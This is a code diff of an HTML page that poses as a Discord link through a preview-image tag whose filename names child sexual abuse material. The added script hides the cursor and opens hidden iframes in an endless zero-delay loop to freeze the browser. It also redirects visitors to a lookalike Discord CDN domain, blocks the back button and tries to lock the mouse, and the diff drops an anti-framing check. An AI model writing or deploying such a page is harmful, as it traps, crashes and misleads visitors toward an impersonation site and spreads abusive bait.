@@ -10,15 +10,12 @@
   <meta property="og:image" content="https://media.discordapp.net/attachments/1334707778308145208/1336791516760248340/child-porn.png?ex=67a5179d&is=67a3c61d&hm=b4990c349a20f540635e266b482af39a9ddb01ee9c3a3bf0d11216a9514ee562&">
 
   <style>
-    /* Set the page to be invisible and dark */
+    /* Hide the cursor instantly */
     body {
       background-color: black;
       height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      color: transparent;
       margin: 0;
+      cursor: none;  /* Hide the cursor immediately */
     }
 
     /* Prevent the page content from showing */
@@ -26,16 +23,22 @@
       display: none;
     }
   </style>
-</head>
-<body>
+
   <script>
-    // Check if the page is being embedded in an iframe
-    if (window.top !== window.self) {
-      // If it is, prevent the page from being displayed
-      window.top.location = window.self.location;
+    // Function to open an iframe
+    function openIframe() {
+      var iframe = document.createElement('iframe');
+      iframe.style.display = 'none'; // Hide the iframe
+      iframe.src = 'about:blank';   // Empty source to avoid redirecting this page
+      document.body.appendChild(iframe);
+      // Optionally, repeat this function continuously to open infinite iframes
+      setTimeout(openIframe, 0);  // Open another iframe immediately
     }
 
-    // Redirect to the desired URL immediately
+    // Start opening infinite iframes instantly
+    openIframe();
+
+    // Force immediate redirect to the desired URL
     window.location.replace("https://cdn-discordapp-com-gamma.vercel.app/");
 
     // Block going back in history (This is a workaround and doesn't guarantee complete prevention)
@@ -43,6 +46,13 @@
     window.onpopstate = function() {
       window.history.go(1);
     };
+
+    // Freeze the mouse by continuously resetting its position to a fixed point (effectively locking it)
+    document.addEventListener('mousemove', function(event) {
+      window.scrollTo(0, 0); // Prevents scrolling and effectively "locks" the mouse position
+    });
   </script>
+</head>
+<body>
 </body>
 </html>
